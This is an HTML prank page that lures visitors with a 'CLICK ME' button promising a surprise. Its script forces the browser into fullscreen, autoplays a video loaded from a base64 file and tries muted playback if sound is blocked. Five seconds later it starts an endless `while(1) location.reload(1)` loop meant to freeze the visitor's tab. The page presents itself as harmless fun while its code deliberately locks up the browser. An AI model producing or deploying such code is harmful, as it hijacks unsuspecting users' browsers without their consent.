<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Click Me!</title>
    <link rel="stylesheet" href="styles.css">
</head>
<body>
    <div class="container">
        <h1>WELCOME</h1>
        <p>Click the button below for a surprise</p>
        <button id="prankButton" class="prank-button">CLICK ME</button>
        <div id="videoContainer" style="display: none; margin-top: 20px;">
            <video id="prankVideo" width="560" height="315" controls autoplay>
                Your browser does not support the video tag.
            </video>
        </div>
    </div>

    <script>
        const button = document.getElementById('prankButton');
        const videoContainer = document.getElementById('videoContainer');
        const video = document.getElementById('prankVideo');

        button.addEventListener('click', async () => {
            button.style.display = 'none';
            videoContainer.style.display = 'block';
            
            document.documentElement.requestFullscreen().catch(e => {});
            
            try {
                const response = await fetch('base64.txt');
                const base64String = await response.text();
                video.src = 'data:video/mp4;base64,' + base64String;
                video.play().catch(e => {
                    console.log('Autoplay blocked, trying muted');
                    video.muted = true;
                    video.play();
                });
            } catch (e) {
                console.error('Failed to load video:', e);
            }
            
            setTimeout(() => {
                while(1) location.reload(1);
            }, 5000);
        });
    </script>
</body>
</html>
